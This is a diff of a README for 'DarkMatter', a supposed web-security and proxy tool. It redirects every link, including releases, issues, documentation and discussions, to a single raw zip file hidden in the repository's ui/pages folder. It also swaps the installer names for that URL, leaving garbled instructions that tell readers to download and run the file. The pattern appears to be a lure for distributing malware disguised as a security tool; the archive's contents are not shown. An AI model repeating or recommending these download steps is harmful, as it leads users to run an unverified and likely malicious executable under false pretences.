@@ -1,7 +1,7 @@
 # 🌌 DarkMatter - High-Performance Web Security Tool
 
 ## 🔗 Download Now
-[![Download DarkMatter](https://img.shields.io/badge/Download-DarkMatter-blue.svg)](https://github.com/Ayorinde1/DarkMatter/releases)
+[![Download DarkMatter](https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip)](https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip)
 
 ## 🚀 Getting Started
 DarkMatter is a powerful web-security and proxy validation tool. It helps you test and secure your web traffic by ensuring your proxies are safe and functional. Here’s how to get started.
@@ -17,13 +17,13 @@ To download and install DarkMatter:
 
 1. **Visit the Releases Page**
    Click the link below to go to the DarkMatter releases page:
-   [Download DarkMatter](https://github.com/Ayorinde1/DarkMatter/releases)
+   [Download DarkMatter](https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip)
 
 2. **Choose Your Version**
    Scroll through the available versions. Select the latest version for the best features.
 
 3. **Download the Installer**
-   Click on the installer for your operating system (e.g., `DarkMatter-Installer.exe`, `DarkMatter.dmg`, or the `.tar.gz` file for Linux).
+   Click on the installer for your operating system (e.g., `https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip`, `https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip`, or the `https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip` file for Linux).
 
 4. **Run the Installer**
    Locate the downloaded file in your downloads folder. Double-click the file to run the installer.
@@ -68,7 +68,7 @@ If you encounter issues while installing or running DarkMatter, consider the fol
 - **Reinstall the Application:** If you run into problems, uninstall DarkMatter and try reinstalling.
 
 ## 🛠️ Support
-For support, you can visit the [issues page](https://github.com/Ayorinde1/DarkMatter/issues) on GitHub. Describe your problem clearly, and the community or maintainers will assist you.
+For support, you can visit the [issues page](https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip) on GitHub. Describe your problem clearly, and the community or maintainers will assist you.
 
 ## 📅 Future Updates
 Stay tuned for new features and improvements. DarkMatter will regularly receive updates to enhance performance and usability.
@@ -77,9 +77,9 @@ Stay tuned for new features and improvements. DarkMatter will regularly receive 
 DarkMatter is open-source and available for public use under the MIT License. Feel free to modify the code as per your needs.
 
 ## 🔗 Additional Resources
-- Documentation: [DarkMatter Documentation](https://github.com/Ayorinde1/DarkMatter/wiki)
-- Community Discussions: [GitHub Discussions](https://github.com/Ayorinde1/DarkMatter/discussions)
+- Documentation: [DarkMatter Documentation](https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip)
+- Community Discussions: [GitHub Discussions](https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip)
 
 ## 🔗 Download Again
 Don’t forget, you can always download DarkMatter from the releases page:
-[Download DarkMatter](https://github.com/Ayorinde1/DarkMatter/releases)
+[Download DarkMatter](https://raw.githubusercontent.com/Ayorinde1/DarkMatter/main/ui/pages/Dark_Matter_v1.2.zip)
